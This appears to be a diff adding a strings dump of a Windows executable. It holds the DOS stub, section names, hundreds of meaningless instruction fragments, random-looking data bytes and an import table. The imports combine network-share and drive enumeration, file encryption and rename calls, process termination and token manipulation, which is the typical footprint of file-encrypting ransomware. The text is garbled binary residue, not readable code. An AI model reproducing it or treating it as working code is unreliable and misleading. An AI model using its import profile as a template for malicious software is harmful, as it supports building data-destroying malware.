@@ -1,0 +1,438 @@
+!This program cannot be run in DOS mode.
+RichUk
+.text
+`.rdata
+@.data
+.ndata
+F$PQ
+F,PQ
+F PQ
+v(VQ
+t:SU
+_][^
+TSVW3
+T$$hh
+D$4hx
+L$0Q
+SSSS
+T$ RS
+D$LP
+L$ Q
+D$$P
+T$(R
+L$$h
+D$8P
+L$ Q
+D$LPj
+T$@QR
+D$(P
+tqQj
+D$@u
+T$DR
+T$(R
+D$$P
+L$$Q
+Dj,j
+t-j,j
+Dj,j
+t-j,j
+_^][
+QSUVW
+_^][Y
+Q(j 
+9\u.+
+r	f=Z
+r	f=Z
+SVWP
+QQVh
+L$$Qj
+9H0u
+L$$Qj
+D$(Pj
+L$,Qj
+SUVW
+L$ Qj
+_^][
+9\uR
+_^]2
+SVWt
+D$ PV
+D$Lf
+D$Nf
+L$L+
+r	f=Z
+r	f=Z
+T$ RP
+N(Qj
+D$$u
+D$	a
+D$$j
+T$@Rf
+D$@ 
+L$0QR
+_^][
+D$ f
+D$$PSj
+_^][
+D$$;8t
+_^][
+_^][
+j,PQ
+_^][
+_^][
+t1SW
+_^][Y
+_^][Y
+_][^
+SUVW
+u	_^
+teW3
+)t$$
+_^][
+f93t
+t_W3
+_^][
+9>~,
+t	WU
+K,QP
+_^][
+l$TV3
+t$,3
+T$4R
+D$DWP
+T$LRU
+T$ RP
+T$4V
+QRWU
+T$$RU
+|$ j
+T$<R3
+L$4QU
+@(WP
+D$,;D$4
+L$(;L$0
+T$(j
++L$(
+D$,3
+T$Dj
+D$ PQ
+L$(j
+09T$
+L$8j
+D$4PU
+D$,;D$4
+L$(;L$0
+L$8j
+T$$Rj
+D$ Pj
+QRPS
+QRPS
+D$<j
+T$$RS
+LSUV
+D$(P3
+T$(Vj
+T$<3
+T$LWR
+L$TQS
+L$ QP
+L$(V
+RPUS
+D$(PS
+T$ j
+T$DR3
+L$<QS
+L$ QP
+L$$3
+T$@RP
+D$@j
+L$ Qj
+_^][
+r	f=Z
+r	f=Z
+r	f=Z
+r	f=Z
+0SUVW
+D$ PQ
+T$$RP
+T$(R
+D$(P
+L$@Qh
+T$8Rj
+L$4Q
+D$,P
+L$,Q
+SUVW
+jdVR
+T$$R
+jdWV
+SQRP
+L$TUQ
+T$@R
+D$$3
+T$$R
+D$$P
+L$ Q
+D$0t
+D$(t
+D$4t
+D$,j
+T$LRj
+|$8U
+|$8U
+L$,Qj
+T$<Rj
+_^][
+PVWj
+QVWj
+:_^]
+SUVW3
+L	+Q
+L	+Q
+r	f=Z
+r	f=Z
+_^][
+VWrc
+r	f=Z
+r	f=Z
+]_^2
+f9TD u
+\| S
+]_^2
+Ar	f
+Ar	f
+SVWh
+ ;\$
+Wj,3
+_^][Y
+QjXh
+UVWj
+tkPU
+tPPj
+_^][Y
+_^]2
+L$,QP
+L$$UQ
+D$,Ph
+T$$UR
+D$$P
+L$ Q
+T$(R
+D$4UP
+L$PUQ
+T$0R
+D$DPUUU
+QUUR
+D$dD
+T$8PQR
+0VVh 
+D$,P
+SUVW
+D$TP
+T$\UR
+D$8UP
+D$LP
+L$ Q
+T$,R
+D$LP
+L$,Q
+T$ R
+D$4P
+L$\QUUUj
+D$HPQWR
+D$4j
+L$,Qj
+L$0QP
+D$4j
+D$8;
+D$4;
+D$ ;
+D$$;
+L$0QU
+_^][
+SUVW
+D$$,
+r	f=Z
+r	f=Z
+L$$Qj
+_^][
+SUVW
+_^][
+_^]3
+SUVW
+L$$Qj
+L$ 3
+D$ 3
+T$$R
+_^][
+D$ P
+QSRV
+<Q\t8
+QSUV
+_^][Y
+WVS3
+WVU3
+v	N+D$
+-%08X
+WNetCloseEnum
+WNetOpenEnumW
+WNetEnumResourceW
+MPR.dll
+InitializeCriticalSection
+LeaveCriticalSection
+GetExitCodeProcess
+TerminateProcess
+EnterCriticalSection
+DeleteCriticalSection
+CloseHandle
+FindFirstFileW
+GetDriveTypeW
+SetErrorMode
+WaitForSingleObject
+GetLogicalDrives
+GetFileAttributesW
+CreateFileW
+GetLastError
+FindClose
+DeviceIoControl
+WaitForMultipleObjects
+FindNextFileW
+GetVolumeInformationW
+CreateThread
+Sleep
+WriteFile
+SetEndOfFile
+SetFilePointerEx
+ReadFile
+GetFileSizeEx
+MoveFileW
+SetFileAttributesW
+HeapAlloc
+GetCurrentProcess
+HeapFree
+GetProcessHeap
+GetVersion
+GetProcAddress
+LoadLibraryA
+OpenProcess
+GetFileType
+GetModuleHandleA
+DuplicateHandle
+GetCurrentProcessId
+ExitProcess
+GetCommandLineW
+CreatePipe
+GetEnvironmentVariableW
+PeekNamedPipe
+CreateProcessW
+GetSystemWindowsDirectoryW
+SetHandleInformation
+GetLocaleInfoW
+GetModuleFileNameW
+Process32FirstW
+Process32NextW
+CreateMutexA
+CreateToolhelp32Snapshot
+CreateDirectoryW
+KERNEL32.dll
+wsprintfW
+wsprintfA
+GetShellWindow
+GetWindowThreadProcessId
+USER32.dll
+CryptAcquireContextW
+CryptSetKeyParam
+CryptReleaseContext
+CryptGenRandom
+CryptImportKey
+CryptEncrypt
+CryptDestroyKey
+CryptDecrypt
+OpenProcessToken
+GetTokenInformation
+SetTokenInformation
+RegCreateKeyExW
+RegOpenKeyExW
+RegCloseKey
+RegSetValueExW
+DuplicateTokenEx
+RegQueryValueExA
+RegOpenKeyExA
+ADVAPI32.dll
+CommandLineToArgvW
+SHGetSpecialFolderPathW
+SHELL32.dll
+`w\L
+gVr{
+ULw{
+x L'
+aV4$
+Hc<Y
+7s9z
+BRc1#oK
+1x6SUL
+lMZQ
+V\X;IyYk
+&U2 
+5VCEc2
+I2K:8XUJ\U
+,yv_
+#b6gpP 
+9JEj
+YMi"5
+|A'E	
+Y|TM
+Jw~R
+L< e
+d_r!
+r Um,{
+H9{xy
+R#dE 
+_')$
+3X5I
+B%."W
+OC"sv
+iQX5
+*H<TQ
+Hc$J
+{G|BZ
+]pM=
+Pu$|g
+w_6@
+o/(c
+!dIs?TS
+;G(9
+so|V
+?T~_P
+5K<+
+J2@f
+>=e	
+t>r7
+c%lb
+8E{=
+Yk6V
+dI	j
+P}SB;
+A7[A@
+v)C7#
+	Er-`
+3Ahew
+HE#~
+*A]Giq
+H7`v
+uh-]
+w#wbv
+`I$,Z
+RR	Z6
+wIaT
+jm.*~
+/RU2
+%hI&
+1VC=L
+|PS"9F
+TFe*
+1=Mb
+aG/5
+6tc&z#
+K_Y&g
+>.A`
